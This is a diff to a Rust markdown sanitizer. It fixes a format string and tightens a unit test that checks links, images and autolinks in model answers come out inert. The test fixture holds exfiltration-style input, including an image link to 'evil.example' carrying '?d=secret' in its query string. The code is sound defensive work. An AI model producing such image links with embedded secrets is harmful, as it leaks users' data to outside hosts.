@@ -164,7 +164,7 @@ impl Sanitizer {
                     }
                     let bang = if c.name("bang").is_some() { "!" } else { "" };
                     let text = c.name("text").map_or("", |m| m.as_str());
-                    return format!("{bang}[{text}]\\({})", code(url) + ")");
+                    return format!("{bang}[{text}]\\({})", code(url));
                 }
                 if c.name("close").is_some() {
                     return "]\\(".to_string();
@@ -222,7 +222,10 @@ mod tests {
         let answer = "Reset it in Settings [1].\n![.](https://evil.example/p?d=secret) and [click](https://evil.example/q) <https://evil.example/a> <img src=x>\n[r]: https://evil.example/r\nsee https://evil.example/b [2]";
         let whole = sanitize(answer, None);
         inert(&whole);
-        assert!(whole.starts_with("Reset it in Settings [1].\n![.]\\(`https://evil.example/p?d=secret`)") && whole.ends_with("see `https://evil.example/b` [2]"), "{whole}");
+        assert_eq!(
+            whole,
+            "Reset it in Settings [1].\n![.]\\(`https://evil.example/p?d=secret`) and [click]\\(`https://evil.example/q`) \\<`https://evil.example/a`> \\<img src=x>\n[r]\\: `https://evil.example/r`\nsee `https://evil.example/b` [2]"
+        );
         // However the stream splits it: inert, and only `\` and backticks added.
         let bare = |t: &str| t.replace(['\\', '`'], "");
         for at in 1..answer.len() {
